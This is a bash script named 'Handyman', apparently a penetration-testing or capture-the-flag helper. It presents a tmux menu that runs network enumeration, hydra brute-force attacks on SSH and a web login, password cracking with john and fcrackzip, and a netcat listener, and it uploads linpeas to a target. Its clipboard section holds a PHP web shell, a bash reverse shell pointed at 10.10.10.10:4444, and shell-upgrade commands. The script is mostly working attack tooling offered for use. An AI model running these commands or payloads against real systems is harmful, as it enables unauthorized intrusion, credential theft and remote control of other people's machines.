#! /bin/bash

EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml

COMMAND_e1='nmap -sV -sC $X | highlight "^\d+\/tcp"'
COMMAND_e2='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$X/FUZZ'
COMMAND_e3='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$X | highlight "200|30[12]"'
COMMAND_e4='whatweb -v $X'

COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $X ssh -s PORT'
COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $X -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
COMMAND_7='ssh $USER@$X -p 22'
COMMAND_8='scp ~/Tools/linpeas.sh $USER@$X:/tmp'
COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$X/login.php -d "key=FUZZ"'
COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
COMMAND_b='binwalk -e file.jpg'
COMMAND_c='steghide extract -sf file.jpg'
COMMAND_d='7z x file.zip'
COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
COMMAND_f='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
COMMAND_g='nc -nlvp 4444'
COMMAND_h='scp ~/Tools/handyman.sh $USER@$X:/tmp'

CLIP_1='<?php system($_GET["c"]); ?>'
CLIP_2='bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
CLIP_3="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
CLIP_4="export TERM=xterm"
CLIP_5="stty raw -echo; fg"

show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                Handyman                                      "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  Enumeration:                                                                "
  echo "  ------------                                                                "
  echo "  e1 - $COMMAND_e1"
  echo "  e2 - $COMMAND_e2"
  echo "  e3 - $COMMAND_e3"
  echo "  e4 - $COMMAND_e4"
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  5) $COMMAND_5"
  echo "  6) $COMMAND_6"
  echo "  7) $COMMAND_7"
  echo "  8) $COMMAND_8"
  echo "  9) $COMMAND_9"
  echo "  a) $COMMAND_a"
  echo "  b) $COMMAND_b"
  echo "  c) $COMMAND_c"
  echo "  d) $COMMAND_d"
  echo "  e) $COMMAND_e"
  echo "  f) $COMMAND_f"
  echo "  g) $COMMAND_g"
  echo "  h) $COMMAND_h"
  echo ""
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                  Links                                       "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo ""
  echo "  http://$X/robots.txt"
  echo "  https://gtfobins.github.io/"
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                Clipboard                                     "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  c1) $CLIP_1"
  echo "  c2) $CLIP_2"
  echo "  c3) $CLIP_3"
  echo "  c4) $CLIP_4"
  echo "  c5) $CLIP_5"
  echo ""
  echo "  e(x)it. Exit"
  echo ""
}

runV() {
  tmux setenv X $X
  tmux setenv USER $USER

  tmux split-window -v
  sleep 0.1
  C="$@"
  tmux send-keys "$C"
}

runC() {
  echo "$@" | xclip -sel c

  echo "COPIED!"
}

read_options() {
  local choice
  read -p "Enter choice " choice
  case $choice in
    e1) runV $COMMAND_e1;;
    e2) runV $COMMAND_e2;;
    e3) runV $COMMAND_e3;;
    e4) runV $COMMAND_e4;;

    5) runV $COMMAND_5;;
    6) runV $COMMAND_6;;
    7) runV $COMMAND_7;;
    8) runV $COMMAND_8;;
    9) runV $COMMAND_9;;
    a) runV $COMMAND_a;;
    b) runV $COMMAND_b;;
    c) runV $COMMAND_c;;
    d) runV $COMMAND_d;;
    e) runV $COMMAND_e;;
    f) runV $COMMAND_f;;
    g) runV $COMMAND_g;;
    h) runV $COMMAND_h;;

    c1) runC $CLIP_1;;
    c2) runC $CLIP_2;;
    c3) runC $CLIP_3;;
    c4) runC $CLIP_4;;
    c5) runC $CLIP_5;;

    x) exit 0;;
    exit) exit 0;;

    *) echo -e "Error..."
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

do_menu
